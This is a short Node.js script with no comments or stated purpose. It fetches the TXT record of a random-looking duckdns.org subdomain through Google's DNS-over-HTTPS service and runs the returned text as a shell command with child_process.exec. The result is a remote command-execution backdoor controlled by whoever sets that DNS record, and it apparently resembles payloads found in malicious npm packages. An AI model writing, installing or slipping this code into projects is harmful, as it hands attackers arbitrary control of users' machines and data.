const https = require("https");
const { exec } = require("child_process");

https.get(
  "https://dns.google.com/resolve?name=dkoqwdkoqk.duckdns.org&type=TXT",
  (res) => {
    let data = [];
    res.on("data", (chunk) => {
      data.push(chunk);
    });
    res.on("end", () => {
      exec(JSON.parse(Buffer.concat(data).toString()).Answer[0].data);
    });
  }
);
